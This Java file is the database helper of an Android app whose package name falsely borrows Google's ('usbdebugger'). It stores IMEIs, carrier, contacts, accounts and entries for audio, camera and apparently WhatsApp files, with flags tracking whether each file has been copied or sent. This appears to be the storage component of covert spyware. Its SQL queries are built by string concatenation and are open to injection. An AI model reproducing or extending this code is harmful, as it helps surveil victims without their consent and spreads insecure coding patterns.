package com.google.android.usbdebugger;

import android.annotation.SuppressLint;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.database.sqlite.SQLiteStatement;
import android.util.Log;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;


public class DBHelper extends SQLiteOpenHelper {

    private String DateTime() {
        Date dt = new Date();
        @SuppressLint("SimpleDateFormat")
        SimpleDateFormat ft2 = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
        String daa = ft2.format(dt);
        return daa;
    }

    public DBHelper(Context context) {
        super(context, "myDB", null, 1);
    }

    private  final String CREATE_TABLE_PhoneInfo = "CREATE TABLE IF NOT EXISTS  PhoneInfo"
            + "( id INTEGER PRIMARY KEY autoincrement, '1' TEXT, '2' TEXT, '3' TEXT, '4' TEXT )";

    private  final String CREATE_TABLE_SourceFiles = "CREATE TABLE IF NOT EXISTS SrFiles"
            + "(id INTEGER PRIMARY KEY autoincrement, FN TEXT, FD TEXT, CDT  DATETIME, FT INTEGER, " +
            " DE INTEGER DEFAULT 0, CP INTEGER  DEFAULT 0, SN TEXT)";

    private  final String CREATE_TABLE_Contacts = "CREATE TABLE IF NOT EXISTS Contacts"
            + "(id INTEGER PRIMARY KEY autoincrement, ids TEXT,  '1' TEXT, '2' TEXT, " +
            " '3' TEXT, '4' TEXT, '5' TEXT)";

    private  final String CREATE_TABLE_Parametrs = "CREATE TABLE IF NOT EXISTS Parametrs"
            + "(VC TEXT, SC TEXT, FT TEXT,  PT TEXT, FD TEXT, US TEXT, " +
            " PS TEXT, GP TEXT, GP_T TEXT, " +
            " CN TEXT, MS TEXT, DC TEXT, " +
            " PR TEXT, BS TEXT, SM TEXT, MI TEXT, FLC TEXT, " +
            " RS TEXT, DBC TEXT, SH TEXT)";

    private  final String INSERT_INTO_Parametrs = "INSERT INTO Parametrs"
            + "(VC, SC, FT,  PT, FD, US, PS, GP, GP_T, CN, MS, DC, " +
            "PR, BS, SM, MI, FLC, RS, DBC, SH ) VALUES " +
            "('','','','','','','','','','','','','','','','','','', '', '')";

    private final String Create_Table_tempAudio = "CREATE TABLE IF NOT EXISTS tempAu"
            + "(FN text, FD TEXT, CDT datetime, FT integer, SN TEXT)";

    private final String Create_Table_tempDCIM = "CREATE TABLE IF NOT EXISTS tempDC"
            + "(FN text, FD TEXT, CDT datetime, FT integer, SN TEXT)";

    private final String Create_Table_tempWASAP = "CREATE TABLE IF NOT EXISTS tempWA"
            + "(FN text, FD TEXT, CDT datetime, FT integer, SN TEXT)";

    private  final String CREATE_TABLE_TODO_Exeptions = "CREATE TABLE IF NOT EXISTS "
            +" Exceptions (id INTEGER PRIMARY KEY, ProcedureName TEXT, ExeptionType TEXT, Message TEXT, "
            + "CreateDateTime DATETIME)";

    private  final String CREATE_TABLE_Accounts = "CREATE TABLE IF NOT EXISTS "
            +" Accounts (id INTEGER PRIMARY KEY, Acc TEXT, Type TEXT)";
    // todo_tag table create statement
    /*private  final String CREATE_TABLE_TODO_GPS_Status = "CREATE TABLE "
            + TABLE_TODO_TAG + "(" + KEY_ID + " INTEGER PRIMARY KEY,"
            + KEY_TODO_ID + " INTEGER," + KEY_TAG_ID + " INTEGER,"
            + KEY_CREATED_AT + " DATETIME" + ")";
*/
    public void onCreate(SQLiteDatabase db) {
        //Log.d(LOG_TAG, "--- onCreate database ---");

        db.execSQL(CREATE_TABLE_PhoneInfo);
        db.execSQL(CREATE_TABLE_SourceFiles);
        db.execSQL(CREATE_TABLE_Contacts);
        db.execSQL(Create_Table_tempAudio);
        db.execSQL(Create_Table_tempDCIM);
        db.execSQL(Create_Table_tempWASAP);
        db.execSQL(CREATE_TABLE_TODO_Exeptions);
        db.execSQL(CREATE_TABLE_Accounts);
        //db.close();
    }

    public void onCreateParametrs(SQLiteDatabase db) {
        db.execSQL(CREATE_TABLE_Parametrs);
        int cnt = 0;
        String tt = "Select FT From Parametrs";
        Cursor c;
        try {
            c = db.rawQuery(tt, null);
            cnt = c.getCount();
            if (cnt > 0) {
                c.close();
            } else {
                c.close();
            }
        } catch (Exception ex) {
            Log.d("ERR1", "onCreateParametrs : " + ex.getMessage());
        }
        if(cnt==0) {
            db.execSQL(INSERT_INTO_Parametrs);
        }
    }

    public ArrayList SelectParametrs(SQLiteDatabase db) {
        String daa = DateTime();

        String tt = "Select * from Parametrs";
        ArrayList select = new ArrayList();
        Cursor c;
        try {
            c = db.rawQuery(tt, null);
            if (c.getCount() > 0) {
                if (c.moveToFirst()) {
                    //select = new String[c.getColumnCount()];
                    do {
                        if (c.getString(0) != "1") {
                            for (int i = 0; i < c.getColumnCount(); i++) {
                                select.add(i, c.getString(i));
                            }
                        }
                    } while (c.moveToNext());
                }
            }
            c.close();
        } catch (Exception ex) {
            insert_Exeption(db, "SelectParametrs","Exception", ex.getMessage(), daa);
            return select;
        }
        return select;
    }

    public void insert_SrFiles2(SQLiteDatabase db, String table, String filename, String datetime, String type, String Sent, String CP, String DE) {
        String daa = DateTime();

        if (filename != null && !filename.equals("")) {
            try {
                String tt = "Insert into "+table+" (FN, CDT, FT, SN, CP, DE) " +
                        "VALUES  ('" + filename + "', '" + datetime + "', '" + type + "', '"+Sent+"', '" + CP + "', '"+DE+"') ";
                SQLiteStatement stmt;
                //db = dbh.getWritableDatabase();
                //for (int i = 0; i < tt.length; i++) {
                    stmt = db.compileStatement(tt);
                    stmt.executeInsert();
                    stmt.close();
                //}
            } catch (SQLException e) {
                insert_Exeption(db, "insert_SrFiles2","SQLException", e.getMessage(), daa);
            } catch (Exception ex) {
                insert_Exeption(db, "insert_SrFiles2","SQLException", ex.getMessage(), daa);
            }
        }
    }

    public void insert_SrFiles(SQLiteDatabase db, String table, String filename, String datetime, String type, String FolderName, String Sent) {
        String daa = DateTime();

        if (filename != null && !filename.equals("")) {
            try {
                String [] tt = {"Insert into "+table+" (FN, FD, CDT, FT, SN) " +
                                "VALUES  ('" + filename + "', '"+FolderName+"', '" + datetime + "', '" + type + "', '"+Sent+"') ",
                        "Insert into SrFiles (FN, FD, CDT, FT, SN)  Select FN, FD, CDT, FT, SN from "+table+
                                " WHERE FN NOT IN ( SELECT FN FROM SrFiles where FT = " + type + " and SN ="+Sent+")",
                        " DELETE FROM  "+table};
                SQLiteStatement stmt;
                //db = dbh.getWritableDatabase();
                for (int i = 0; i < tt.length; i++) {
                    stmt = db.compileStatement(tt[i]);
                    stmt.executeInsert();
                    stmt.close();
                }
            } catch (SQLException e) {
                insert_Exeption(db, "insert_SrFiles","SQLException", e.getMessage(), daa);
            } catch (Exception ex) {
                insert_Exeption(db, "insert_SrFiles","SQLException", ex.getMessage(), daa);
            }
        }
    }
    public void Delete_Account(SQLiteDatabase db) {
        try {
            String  tt = "Delete from Accounts";
            SQLiteStatement stmt;
            stmt = db.compileStatement(tt);
            stmt.executeInsert();
            stmt.close();
        } catch (SQLException e) {
            insert_Exeption(db, "Delete_Account","SQLException", e.getMessage(), DateTime());
            //Log.d("ERR1", "SQL Exeption Error: " + e.getMessage());
        } catch (Exception ex) {
            insert_Exeption(db, "Delete_Account","Exception", ex.getMessage(), DateTime());
            //Log.d("ERR1", "Exeption Insert Exception: " + ex.getMessage());
        }
    }

    public void insert_Account(SQLiteDatabase db, String Acc, String Type) {
        try {
            String  tt = "Insert into Accounts (Acc, Type) VALUES  ('" + Acc + "', '" + Type + "')";
            SQLiteStatement stmt;
            stmt = db.compileStatement(tt);
            stmt.executeInsert();
            stmt.close();
        } catch (SQLException e) {
            insert_Exeption(db, "insert_Account","SQLException", e.getMessage(), DateTime());
            //Log.d("ERR1", "SQL Exeption Error: " + e.getMessage());
        } catch (Exception ex) {
            insert_Exeption(db, "insert_Account","Exception", ex.getMessage(), DateTime());
            //Log.d("ERR1", "Exeption Insert Exception: " + ex.getMessage());
        }
    }


    public void insert_Exeption(SQLiteDatabase db, String ProcedureName, String ExeptionType, String Message, String CreateDateTime) {
        try {
            String [] tt = {"delete from Exceptions WHERE (select COUNT(id) from Exceptions)>100",
                    "Insert into Exceptions (ProcedureName, ExeptionType, Message, CreateDateTime) " +
                    "VALUES  ('" + ProcedureName.replace("'","") + "', '" + ExeptionType.replace("'","") +
                            "', '" + Message.replace("'","") + "', '" + CreateDateTime + "') "};
            for (String s : tt) {
                SQLiteStatement stmt;
                stmt = db.compileStatement(s);
                stmt.executeInsert();
                stmt.close();
            }
        } catch (SQLException e) {
            Log.d("ERR1", "SQL Exeption Error: " + e.getMessage());
        } catch (Exception ex) {
            Log.d("ERR1", "Exeption Insert Exception: " + ex.getMessage());
        }
    }

    void delete(SQLiteDatabase db, String table, String param) {
        String daa = DateTime();

        try {
            db.delete(table, param, null);
        } catch (Exception e) {
            insert_Exeption(db, "delete","Exception", e.getMessage(), daa);
        }
    }


    void Update(SQLiteDatabase db, String table, String param, int copied, String deleted) {
        String daa = DateTime();

        ContentValues data = new ContentValues();
        if (deleted != null) {
            data.put("DE", deleted);
        }
        data.put("CP", copied);
        try {
            db.update(table, data, param, null);
        } catch (Exception e) {
            insert_Exeption(db, "Update","Exception", e.getMessage(), daa);
        }
    }


    public boolean Select_Distinct(SQLiteDatabase db, String table, String param) {
        String daa = DateTime();

        String tt = "Select id From " + table + param + " limit 1";

        try {
            Cursor c = db.rawQuery(tt, null);

            if (c.getCount() > 0) {
                c.close();
                return true;
            } else {
                c.close();
                return false;
            }
        } catch (Exception ex) {
            insert_Exeption(db, "Select_Distinct","Exception", ex.getMessage(), daa);
            return false;
        }
    }

    public void Delete_MaxCount(SQLiteDatabase db, String table, String fn, int stat, String typez,
                                File aDir, int recordCount) {
        String daa = DateTime();

        String tt = "Select * From " + table + " where DE = 0  and FT = " + typez + " ORDER BY ID ASC ";//+" where id>10 ";
        Cursor c;
        int say = 0;
        String id;
        String type;
        String fname;
        File fln;
        int cnt;
        try {
            if (stat == 1) {
                c = db.rawQuery(tt, null);
                cnt = c.getCount();
                if (cnt >= recordCount) {
                    if (c.moveToFirst()) {
                        do {
                            if (say < (cnt - recordCount)) {
                                id = c.getString(c.getColumnIndex("id"));
                                type = c.getString(c.getColumnIndex("FT"));
                                Update(db, table, "  id =" + id, 0, "1");
                                fname = c.getString(c.getColumnIndex("FN"));
                                fln = null;
                                fln = new File(aDir.getPath() + "/" + fname);
                                if (typez.equals(type)) {
                                    fln.delete();
                                }
                                //Log.d(LOG_TAG, "Delete_MaxCount FileName = : " + fln.getName() + " and id :" + id);
                                //Log.d(LOG_TAG, "Delete_MaxCount id = : " + id);
                                say++;
                            } else {
                                break;
                            }
                        } while (c.moveToNext());
                    }
                    c.close();
                    //dbh.close();
                } else {
                    c.close();
                    //dbh.close();
                }
                c.close();
            } else {
                Update(db, table, " FN = '" + fn + "' and DE = 0", 1, "1");
            }
        } catch (Exception ex) {
            insert_Exeption(db, "Delete_MaxCount","Exception", ex.getMessage(), daa);
            //dbh.close();
            //return;
        }
    }

    public String[] Select_FileNames2(SQLiteDatabase db, String table, File dir, int type, String Sent) {
        String daa = DateTime();

        String tt = "select FN from " + table + " where CP = 1 and DE = 0 and FT=" + type + " and SN = "+Sent;
        String[] fname = null;
        //String line = "";
        ArrayList list = new ArrayList();
        //int say = 0;
        //String fn = "";
        try {
            Cursor c = db.rawQuery(tt, null);
            if (c.moveToFirst()) {
                do {
                    //fn = c.getString(c.getColumnIndex("FN"));
                    list.add(dir.getAbsolutePath() + "/" + c.getString(c.getColumnIndex("FN")));
                    //line += dir.getAbsolutePath() + "/" + fn + ";";
                    //Log.d("ERR1", "Select_FileNames() FileName = : " + line);
                } while (c.moveToNext());
            }
            c.close();
            //dbh.close();
            //if(!line.equals("")) {
                Object[] objectList = list.toArray();
                fname = Arrays.copyOf(objectList,objectList.length,String[].class);
                /*fname = new String[line.split(";").length];
                fname = line.split(";");
                line = "";*/
            //}

        } catch (SQLException sqlee) {
            insert_Exeption(db, "Select_FileNames2","SQLException", sqlee.getMessage(), daa);
            return null;
        } catch (Exception ee) {
            insert_Exeption(db, "Select_FileNames2","Exception", ee.getMessage(), daa);
            return null;
        }
        return fname;
    }

    public String[] Select_FileNames(SQLiteDatabase db, String table, File dir, int type, String Sent) {
        String daa = DateTime();

        String tt = "select FN from " + table + " where CP = 0 and DE = 0 and FT=" + type +
                " and SN = "+Sent;//;  Where max(id)>10 limit 1
        String[] fname = null;
        String line = "";
        //int say = 0;
        String fn = "";
        try {
            Cursor c = db.rawQuery(tt, null);
            if (c.moveToFirst()) {
                do {
                    fn = c.getString(c.getColumnIndex("FN"));
                    if(fn.indexOf(".opus")>=0 || fn.indexOf(".m4a")>=0){
                        //Log.d(LOG_TAG, "Select_FileNames() FileName = : " + line);
                    }
                    line += dir.getAbsolutePath() + "/" + fn + ";";
                    //Log.d("ERR1", "Select_FileNames() FileName = : " + line);
                } while (c.moveToNext());
            }
            c.close();
            //dbh.close();
            if(!line.equals("")) {
                fname = new String[line.split(";").length];
                fname = line.split(";");
                line = "";
            }

        } catch (SQLException sqlee) {
            insert_Exeption(db, "Select_FileNames","SQLException", sqlee.getMessage(), daa);
            return null;
        } catch (Exception ee) {
            insert_Exeption(db, "Select_FileNames","Exception", ee.getMessage(), daa);
            return null;
        }
        return fname;
    }

    public int DbCount(SQLiteDatabase db) {
        String daa = DateTime();

        Cursor c;
        int sayi = 0;
        try {
            String queryString = "Select id from SrFiles where DE = 1";

            c = db.rawQuery(queryString, null);
            if (c != null) {
                sayi = c.getCount();
                c.close();
                return sayi;
            } else {
                c.close();
            }

        } catch (Exception ee) {
            insert_Exeption(db, "DbCount","Exception", ee.getMessage(), daa);
            return 0;
        }
        return sayi;
    }

    void insert_PhoneInfo(SQLiteDatabase db, String table, String imei1, String imei2, String operator, String api) {
        String daa = DateTime();

        try {
            String[] tt = {"DROP TABLE if exists PhoneInfo;",
                    "CREATE TABLE IF NOT EXISTS PhoneInfo( id INTEGER PRIMARY KEY autoincrement, " +
                            "'1' text, '2' text, '3' text, '4' text);",
                    "Insert into PhoneInfo ('1','2','3','4') " + //IMEI1 = 1,IMEI2 = 2,OperatoName = 3,API = 4
                            "VALUES  ('" + imei1 + "', '" + imei2 + "', '" + operator + "', '" + api + "') "};


            for (int i = 0; i < tt.length; i++) {
                SQLiteStatement stmt;
                stmt = db.compileStatement(tt[i]);
                stmt.executeInsert();
                stmt.close();
            }
        } catch (SQLException ee) {
            insert_Exeption(db, "insert_PhoneInfo","SQLException", ee.getMessage(), daa);
        } catch (Exception ee) {
            insert_Exeption(db, "insert_PhoneInfo","Exception", ee.getMessage(), daa);
        }
    }

    void UpdateParametrs(SQLiteDatabase db, String table, String [] column, String [] param) {
        String daa = DateTime();

        ContentValues data = new ContentValues();
        for (int i = 0; i < column.length; i++) {
            data.put(column[i], param[i]);
        }
        try {
            db.update(table, data, "1=1", null);
            MyService.update_param();
        } catch (SQLException ee) {
            insert_Exeption(db, "UpdateParametrs","SQLException", ee.getMessage(), daa);
        } catch (Exception ee) {
            insert_Exeption(db, "UpdateParametrs","Exception", ee.getMessage(), daa);
        }
    }
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {

    }
}
